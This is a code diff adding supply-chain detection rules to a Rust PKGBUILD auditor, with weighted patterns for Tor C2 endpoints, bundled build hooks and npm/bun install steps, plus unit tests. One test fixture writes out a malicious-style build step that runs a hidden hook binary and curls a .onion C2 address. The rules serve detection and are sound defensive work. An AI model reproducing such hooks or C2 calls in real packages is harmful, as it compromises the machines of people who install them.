@@ -563,6 +563,35 @@ pub fn audit_pkgbuild(pkgbuild: &str) -> (Vec<String>, i32) {
         }
     }
 
+    // Supply-chain / build-time code-execution patterns.
+    //
+    // Modeled on the June 2026 "Atomic Arch" AUR campaign, where adopted
+    // orphan packages injected malicious npm/bun dependencies and executed a
+    // bundled ELF payload via install hooks. These patterns flag the
+    // *techniques* rather than specific IOCs, so they stay relevant as the
+    // payloads change.
+    let supply_chain_patterns = [
+        (".onion", 9),     // Tor hidden-service C2 endpoint
+        ("src/hooks/", 8), // Bundled hook scripts/binaries run during build
+        ("preinstall", 7), // npm lifecycle hook executing local code
+        ("postinstall", 7),
+        ("bun install", 5), // Fetches and runs JS deps at build time
+        ("bun add", 5),
+        ("npm install", 4),
+        ("pnpm install", 4),
+        ("yarn add", 4),
+    ];
+
+    for (pattern, severity) in &supply_chain_patterns {
+        if pkgbuild.contains(pattern) {
+            warnings.push(format!(
+                "📦 SUPPLY-CHAIN: build-time dependency/hook pattern '{}' (severity: {})",
+                pattern, severity
+            ));
+            risk_score += severity;
+        }
+    }
+
     // Check for suspicious URLs
     let suspicious_domains = [
         "bit.ly",
@@ -572,6 +601,7 @@ pub fn audit_pkgbuild(pkgbuild: &str) -> (Vec<String>, i32) {
         "pastebin.com",
         "hastebin.com", // Code paste sites
         "tempfile.org",
+        "temp.sh",
         "0x0.st", // Temporary file hosts
     ];
 
@@ -711,5 +741,53 @@ pub fn parse_pkgname_ver(content: &str) -> Option<(String, String)> {
     match (name, ver) {
         (Some(n), Some(v)) => Some((n, v)),
         _ => None,
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn clean_pkgbuild_has_no_supply_chain_findings() {
+        let pkgbuild = r#"
+            pkgname=hello
+            pkgver=1.0
+            build() { make; }
+            package() { make DESTDIR="$pkgdir" install; }
+        "#;
+        let (warnings, _) = audit_pkgbuild(pkgbuild);
+        assert!(
+            !warnings.iter().any(|w| w.contains("SUPPLY-CHAIN")),
+            "clean PKGBUILD should not raise supply-chain warnings"
+        );
+    }
+
+    #[test]
+    fn detects_bundled_hook_and_onion_c2() {
+        // Mirrors the Atomic Arch technique: a bundled binary under src/hooks
+        // executed during build, plus a Tor C2 endpoint.
+        let pkgbuild = r#"
+            pkgname=trusted-orphan
+            build() {
+                ./src/hooks/deps
+                curl http://olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion/api/agent
+            }
+        "#;
+        let (warnings, risk_score) = audit_pkgbuild(pkgbuild);
+        assert!(warnings.iter().any(|w| w.contains("src/hooks/")));
+        assert!(warnings.iter().any(|w| w.contains(".onion")));
+        assert!(risk_score >= 17, "score was {risk_score}");
+    }
+
+    #[test]
+    fn detects_npm_lifecycle_hook() {
+        let install_hook = r#"
+            post_install() {
+                npm install atomic-lockfile@1.4.2
+            }
+        "#;
+        let (warnings, _) = audit_pkgbuild(install_hook);
+        assert!(warnings.iter().any(|w| w.contains("npm install")));
     }
 }
